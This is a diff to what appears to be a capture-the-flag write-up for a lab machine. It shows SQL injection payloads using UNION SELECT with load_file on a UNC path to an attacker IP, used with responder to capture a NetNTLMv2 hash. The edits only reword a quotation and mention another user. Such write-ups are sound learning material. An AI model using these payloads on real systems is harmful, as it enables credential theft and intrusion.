@@ -124,8 +124,8 @@ This indicates that the secure file privilege parameter is not effective.
 I tried the example by osanda but it seemed to not work in this case. 
 Checking 0xdf's write-up of this box I found that he uses a similar method, however much simpler:
 ```
-I also successfully got a NetNTLMv2 hash for the user (just like in Giddy and Querier by starting `responder` and submitting 
-`term=10' UNION SELECT 1,load_file('\\\\10.10.14.5\\test'),3-- -`:
+" I also successfully got a NetNTLMv2 hash for the user (just like in Giddy and Querier by starting `responder` and submitting 
+`term=10' UNION SELECT 1,load_file('\\\\10.10.14.5\\test'),3-- - " he states.
 ```
 
 Querying `term=1'union select load_file('\\\\10.10.14.2\\test'),2,3;-- -`
@@ -161,5 +161,6 @@ Querying `term=1'union select load_file('\\\\10.10.14.2\\test'),2,3;-- -`
 
 ```
 
-I don't know why this worked and Osanda's did not. I will have to continue reading about it. Also, this hash does not seem crackable.
+I don't know why this worked and Osanda's did not. I will have to continue reading about it. Also, this hash does not seem crackable, taking note that we have another user named `Cortin.`
+
 
